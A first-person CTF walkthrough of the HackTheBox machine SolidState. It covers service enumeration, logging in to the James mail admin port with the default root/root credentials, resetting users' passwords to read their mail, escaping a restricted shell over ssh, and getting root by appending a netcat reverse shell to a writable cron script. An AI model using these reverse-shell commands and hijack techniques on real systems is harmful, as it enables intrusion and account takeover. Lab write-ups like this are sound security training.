
# CTF Writeup: SolidState on HackTheBox
## DATE January 2018


![A0](https://i.imgur.com/TiihkOi.png)

## Introduction



As a whole, SolidState is a beginner’s CTF.<br>
However, if you are able to solve it, you are well on your way to the more intermediate level CTFs.<br>
You can’t just run an exploit, get root and reuse passwords all the way to glory.<br>
This box requires actual enumeration, exploit research and investigation, and prior knowledge.<br>


There is a key concept that you will have to know about ahead of time.<br>
The box does not offer much in the way of a hint in it’s direction. <br>


I was able to solve it by browsing through Ben Clark’s *Red Team Field Manual* and researching enumeration and privilege escalation guides online.<br>
Shoutout to (g0tm1lk)[ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/] and [mubix]( https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List) for showing the way.

It is a great test of your ability to understand what exactly you might be looking for while enumerating. It’s a fun one.


This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work.<br>
The tools come with a stock Kali installation, unless otherwise mentioned.


## 1. Initial Scans


Before anything, I added the IP to my `/etc/hosts` for convenience as `solidstate.htb` <br>



I began with my [benmap.sh]( https://github.com/berzerk0/textfiles/blob/master/Shell_Scripts/benmap.sh) script, which runs nmap in stages.


The most important outputs came from an `nmap` command that was similar to 

`nmap -F solidstate.htb`

<br>
![A1]( https://i.imgur.com/nMLbDQc.png)
<br>

Our scan finds the box is running
* SSH at port 22
* SMTP at port 25
* HTTP at port 80
* POP3 at port 110
* NNTP at port 119


Ports 25, 110 and 119 all seemed to contain software named James, which was very interesting. However, I usually like to start with HTTP scans. I set those in motion before investigating James.


nikto -h http://solidstate.htb -o nikto_result.txt


<br>
![A2](https://i.imgur.com/d1g9ekt.png)
<br>


I like to do my web directory bruteforcing with [dirsearch.]( https://github.com/maurosoria/dirsearch)


`dirsearch -u http://solidstate.htb -e php,txt,html,jpg,gif,htm,js,aspx --plain-text-report=dirsearch_quick_result`


<br>
![A3]( https://i.imgur.com/de8eWiN.png)
<br>


I’ve included the results here, but I began digging at James before they had finished.

James runs on SMTP and POP3, it might be some kind of email-related service. Maybe [findsploit]( https://github.com/1N3/Findsploit) has something interesting

`findsploit james`


<br>
![A4](https://i.imgur.com/AGa2CVV.png)
<br>


That RCE exploit matches our version of James.
Let’s just run it and see if we get RCE.


<br>
![A5](https://i.imgur.com/ElLnxJ3.png)
<br>


"Will be executed when someone logs in"

But, Who is going to log in? Some other HackTheBox user?
I’d rather not wait for that.


This exploit can’t be useless, however.
RCE usually entails some sort of powerful access.


## 2. Enumerating James

Maybe we can find what gives the exploit it’s effectiveness and redirect it in some way. 



<br>
![A6](https://i.imgur.com/80AyjM7.png)
<br>


The exploit script contains credentials.
Both username and password are `root`
Seems like we are dealing with top notch security here.
 
Just for the hell of it, I tried `ssh root@solidstate.htb` with the password `root` - this didn’t work. I was not surprised.


The exploit is attempting to connect to port 4555, maybe I can do that myself using `nc` ?


`nc solidstate.htb 4555` 
then connect with `root root`

<br>
![A7]( https://i.imgur.com/Ud58gyW.png)
<br>


`help` tells us about the ability to create a new user.
Maybe our new user will have access to the system in some way?
Let’s see what will happen.



`adduser frank beans`
`quit`

<br>
![A8]( https://i.imgur.com/BqSWnB9.png)
<br>


Frank is here to cause trouble, but what can he do? 
Let’s look at the ports for guidance.


SMTP is used to *send* emails. <br>
POP3 is used to *read* emails. <br>
NNTP is for Usenet, which I know nothing about. If I run out of ideas, I will come back to it.


It’s pretty unlikely someone is going to be sending Frank any new emails – unless James has some sort of automated features in place.
Will Frank get an email containing a randomly generated SSH password?



`nc telnet solidstate.htb 110` didn't work.
 

I dug around online and eventually found that SMTP can be communicated with over `telnet`


`telnet solidstate.htb 110`


This worked!


`USER frank`
`PASS beans`
`LIST`

<br>
![A9](https://i.imgur.com/X2jxwoJ.png)
<br>


No messages for Frank.
Port 4555 also allowed me to change the passwords for the other users.
Maybe one of them has something interesting in their inbox.



`nc solidstate.htb 4555`
`listusers`


We see a username with `bash_completion.d` exists, I bet this was created by the exploit script we ran earlier. If there aren’t any good emails, we will look into that.


Using the `setpassword` command, we can set all passwords to `beans`.

<br>
![A10]( https://i.imgur.com/ki4NPdL.png)
<br>


Then, we can use the same email-checking process we used for Frank, but for all the users.

I started with `mailadmin` and `james` - but neither had any mail. I moved on to the other users, going down the list and checking to see who had mail. 

<br>
![A11]( https://i.imgur.com/cTXYfdh.png)
<br>

Mindy has two emails for us!

`RETR 1`

<br>
![A12]( https://i.imgur.com/sMEDnAo.png)
<br>

Mindy is a new hire at SolidState security – maybe their IT system gives them some sort of `changeme` -like password at first? Worth a try. Let’s see what is behind email door #2.


`RETR 2`

<br>
![A13]( https://i.imgur.com/NDmcqRC.png)
<br>


```
...Here are your ssh credentials...

username: mindy
pass: P@55W0rd1!2@
```



How nice of them to communicate these in the CLEAR via email.
Passwords in plaintext emails is not a great idea.
Maybe after we exploit her credentials, Mindy can bring change to this organization.


`ssh mindy@solidstate.htb`


## 3. Mindy's Great Escape


As soon as we log in, we see that something is fishy here.


<br>
![A14](https://i.imgur.com/hXiOCNe.png)
![A15]( https://i.imgur.com/MCM7MQz.png)
<br>



Look at all this mess in the terminal, let's `clear` it away.

<br>
![A16](https://i.imgur.com/mhJd3rq.png)
<br>


No clear?<br> 
Uh... this can't be good. 
I hope I can grab the user flag, at least.

<br>
![A17](https://i.imgur.com/Vl8diUv.png)
<br>

User flag captured!



The fact that I can't use `clear` or most other commands is intolerable.
I didn't quite know what was causing me to be so limited, so I tried my standard tty gaining command.

`python -c 'import pty; pty.spawn("/bin/bash")`


But this didn't help. <br>
What else do I know?


When I tried `clear`, the error message included the term `rbash`. <br>
What does this mean? I did a quick search online which lead me to [this SANS article.](https://i.imgur.com/Vl8diUv.png)


It was my understanding that as soon as we logged in with `ssh`, the system locked us into the restricted shell.
Some time before doing this box, I had done [Bandit at overthewire.org](http://overthewire.org/wargames/bandit/) <br>


One of the levels involved using `ssh` to run a command that would be executed right as a user logged in.<br>
This would be run faster than an automatic *kick user* command, allowing the user to maintain access.

 
Perhaps this method could be deployed here as well?


I combined the idea with running a command in tandem with the `ssh` command with the ideas in the SANS paper and came up with:

`ssh mindy@solidstate.htb vi`

Then, from within `vi`, running `:!bash`


This line runs `vi` before the system can apply `rbash`.
Then, we can take advantage of the fact that `vi` can run shell commands from within the text editor to gain `bash`.


While this method did work, I ultimately found out there was a faster method.


`ssh mindy@solidstate.htb bash` 


`bash` is simply run as a command, skipping the `vi` step.<br>
This shell still doesn't have a tty, so we run the ol' python command.


`python -c 'import pty;pty.spawn("/bin/bash")'`

<br>
![A18](https://i.imgur.com/E8ZmR6S.png)
<br>



### 4. Enumeration

Armed with a decent shell, it's time to get some information about the system.


`cat /etc/*release* tells us we are dealing with Debian - this is good news. <br>
Ubuntu CTFs don't like the simplest `nc` reverse shell, but Debian machines do!
I haven't memorized any of the reverse shell commands yet, but `nc local.machine.ip.addr PORT -e /bin/bash` isn't hard to remember.



`sudo -l` is worth a shot, since we have Mindy's password.
Unfortunately, we find out that Mindy doesn't have access to `sudo.`

This might mean we have to exploit or revshell our way to root.

Before diving deeply into enumeration, I decided to do a quick check of some directories.
Finding nothing in any `/home` folders, I decided to check `/opt` for third party software.
We know the system is running `james` - so maybe there are some useful configuration files.

<br>
![A19](https://i.imgur.com/BywMsv6.png)
<br>


One of these files is noteworthy - `tmp.py`.<br>
It is, owned by root, but Mindy has write permissions.
Interesting, let's take a look. <br>

<br>
![A20](https://i.imgur.com/3Be1CTF.png)
<br>


This script seems to just erase the contents of the /tmp folder.
Is the root user expecting me to put something in there? 
But so what? I can put things in another directory if I want. 


This seems like the kind of command that would be run on a regular basis.
If it was just going to be run once, the root user would just run the command.
It's likely that this script is run automatically, and likely periodically.
Does root just run it with a cronjob?



### 5. Waiting For the Root to Sprout

If the script is run as a cronjob, then we just need to add a line that starts a reverse shell.
Since it would be executed as root, the shell would have root privileges.



First off, let's set up the listener.
We want to catch the shell as soon as the command is sent, so let's set that up first.

On our local machine, we run:

`nc -lnvp PORTNUM`


Next, we need to edit the script to include our revshell command.<br>
But, before we do this, let's make a copy just in case we mess it up.

`cp /opt/tmp.py /dev/shm/copy.py`


We can't write it to `/tmp`, since that gets cleaned out with our script.
We can't write it to `/opt`, since we don't have permission. 
`/dev/shm` is a good compromise.


This script contains a nice example on how to run `bash` commands from within python. <br>
We just need to use the same method that is already demonstrated in `tmp.py` <br>
Append the command for the simple `nc` revshell onto `tmp.py` using `echo` and `>>`


`echo "os.system('nc local.machine.ip.addr PORTNUM -e /bin/bash')" >> tmp.py`


<br>
![alt1](https://i.imgur.com/A3yVjgI.png)
<br>

Make sure your `PORTNUM` matches the listener.

<br>
![alt2](https://i.imgur.com/8gOPlvx.png)
<br>


Now, all we have to do is wait for the cronjob to run.
If the process takes more than 5-10 minutes, you have done something wrong.	

Soon...

<br>
![A23](https://i.imgur.com/KwNR7Xl.png)	
<br>


The root shell pops open in our 2nd listener.

From here we can do as we please, starting with the capture of the root flag.

`cat /root/root.txt`


